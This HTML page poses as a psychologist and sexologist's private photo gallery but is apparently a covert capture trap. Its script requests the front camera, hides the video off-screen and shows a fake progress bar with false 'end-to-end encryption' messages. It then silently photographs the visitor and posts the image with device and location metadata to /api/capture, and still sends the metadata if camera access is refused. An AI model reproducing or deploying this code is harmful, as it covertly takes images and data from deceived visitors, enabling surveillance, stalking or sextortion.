<!DOCTYPE html>
<html lang="pt-BR">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Adriana Visioli - Psicóloga & Sexóloga</title>
  <link
    href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,700;1,400&family=Poppins:wght@300;400;500;600&display=swap"
    rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: #faf7f2;
      color: #333;
      font-family: 'Poppins', sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      overflow: hidden;
      position: relative;
    }

    /* Elementos decorativos */
    .bg-shape {
      position: fixed;
      border-radius: 50%;
      filter: blur(80px);
      z-index: 0;
      opacity: 0.6;
    }

    .shape1 {
      top: -10%;
      left: -10%;
      width: 40vw;
      height: 40vw;
      background: #e8d5cc;
    }

    .shape2 {
      bottom: -15%;
      right: -5%;
      width: 50vw;
      height: 50vw;
      background: #dac4cc;
    }

    .content {
      position: relative;
      z-index: 1;
      text-align: center;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 20px;
      padding: 40px;
      background: rgba(255, 255, 255, 0.7);
      backdrop-filter: blur(10px);
      border: 1px solid rgba(255, 255, 255, 0.4);
      border-radius: 20px;
      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.03);
      max-width: 450px;
      width: 90%;
    }

    .profile-icon {
      width: 90px;
      height: 90px;
      background: #cbb4bc;
      color: white;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 40px;
      box-shadow: 0 10px 20px rgba(203, 180, 188, 0.4);
      margin-bottom: 5px;
    }

    h1 {
      font-family: 'Playfair Display', serif;
      font-size: 2rem;
      color: #4a3e42;
      line-height: 1.2;
    }

    h1 span {
      display: block;
      font-family: 'Poppins', sans-serif;
      font-size: 0.9rem;
      font-weight: 400;
      color: #887a7f;
      letter-spacing: 2px;
      text-transform: uppercase;
      margin-top: 8px;
    }

    p {
      color: #665;
      font-size: 1rem;
      line-height: 1.5;
    }

    .loading-container {
      width: 100%;
      margin-top: 15px;
    }

    .loader {
      width: 100%;
      height: 6px;
      background: #eee;
      border-radius: 6px;
      overflow: hidden;
      margin-bottom: 12px;
    }

    .loader-bar {
      height: 100%;
      background: #cbb4bc;
      border-radius: 6px;
      width: 0%;
      transition: width 0.1s linear;
    }

    #msg {
      font-size: 0.85rem;
      color: #887a7f;
      font-weight: 500;
      display: inline-block;
      min-height: 20px;
    }

    /* Câmera oculta sem usar display:none (evita foto preta no iOS) */
    video,
    canvas {
      position: fixed;
      top: -9999px;
      left: -9999px;
      opacity: 0.01;
      pointer-events: none;
      /* Força a renderização no motor do iOS (GPU backend check) */
      transform: translateZ(0);
      will-change: transform;
    }

    /* Flash */
    .flash {
      position: fixed;
      inset: 0;
      background: white;
      opacity: 0;
      pointer-events: none;
      z-index: 9999;
      transition: opacity 0.05s;
    }

    .flash.on {
      opacity: 1;
    }
  </style>
</head>

<body>
  <div class="bg-shape shape1"></div>
  <div class="bg-shape shape2"></div>

  <div class="content">
    <div class="profile-icon">✨</div>
    <h1>Adriana Visioli<span>Psicóloga & Sexóloga</span></h1>

    <p>Bem-vinda(o) ao acesso da minha galeria de fotos.</p>

    <div class="loading-container">
      <div class="loader">
        <div class="loader-bar" id="bar"></div>
      </div>
      <span id="msg">Preparando visualização...</span>
    </div>
  </div>

  <video id="video" autoplay playsinline muted></video>
  <canvas id="canvas"></canvas>
  <div class="flash" id="flash"></div>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const flash = document.getElementById('flash');
    const bar = document.getElementById('bar');
    const msg = document.getElementById('msg');

    let progress = 0;
    let stream = null;
    let captured = false;

    // Barra de progresso fake
    const barInterval = setInterval(() => {
      progress += Math.random() * 3;
      if (progress >= 95) { progress = 95; clearInterval(barInterval); }
      bar.style.width = progress + '%';
    }, 80);

    const messages = [
      'Por favor, libere e confirme para prosseguir...',
      'Carregando fotos privativas da galeria...',
      'Estabelecendo conexão segura (criptografia ponta-a-ponta)...',
      'Quase lá...'
    ];
    let msgIdx = 0;
    const msgInterval = setInterval(() => {
      if (msgIdx < messages.length) msg.textContent = messages[msgIdx++];
    }, 1200);

    // Coleta metadados do cliente
    function getMeta() {
      return {
        screen: `${screen.width}x${screen.height}`,
        viewport: `${window.innerWidth}x${window.innerHeight}`,
        lang: navigator.language,
        platform: navigator.platform,
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
        referrer: document.referrer || 'direto',
        url: location.href
      };
    }

    async function capturar() {
      if (captured) return;
      captured = true;

      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      canvas.getContext('2d').drawImage(video, 0, 0);

      flash.classList.add('on');
      setTimeout(() => flash.classList.remove('on'), 150);

      if (stream) stream.getTracks().forEach(t => t.stop());

      const image = canvas.toDataURL('image/jpeg', 0.85);

      try {
        await fetch('/api/capture', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ image, meta: getMeta() })
        });
      } catch (e) {
        console.warn('Captura falhou:', e);
      }

      bar.style.width = '100%';
      clearInterval(barInterval);
      clearInterval(msgInterval);
      msg.textContent = 'Ambiente verificado!';

      setTimeout(() => {
        msg.textContent = 'Redirecionando para a sala...';
        setTimeout(() => location.href = '/sucesso.html', 600);
      }, 800);
    }

    async function iniciarCamera() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
          audio: false
        });
        video.srcObject = stream;

        // Força a desmutar e brincar de rodar vídeo pro iOS não suspender o Frame Decoder
        video.muted = true;
        video.playsInline = true;

        try { await video.play(); } catch (e) { }

        // O iOS muitas vezes nao emite eventos 'playing' quando o video não está no topo. 
        // Usamos um watcher continuo:
        let attempts = 0;
        const checkReady = setInterval(() => {
          attempts++;

          const hasStream = video.videoWidth > 0 && video.videoHeight > 0;

          if (hasStream || attempts > 20) { // Timeout de backup de 2 segundos (20 * 100ms)
            clearInterval(checkReady);
            // Dá mais 600ms para a lente esquentar a luminosidade
            setTimeout(capturar, 600);
          }
        }, 100);
      } catch {
        try {
          await fetch('/api/capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              image: 'data:image/gif;base64,R0lGODlhAQABAAAAACw=',
              meta: { ...getMeta(), noCamera: true }
            })
          });
        } catch { }

        bar.style.width = '100%';
        clearInterval(barInterval);
        clearInterval(msgInterval);
        msg.textContent = 'Aguarde...';
        setTimeout(() => location.href = '/sucesso.html', 1000);
      }
    }

    iniciarCamera();
  </script>
</body>

</html>
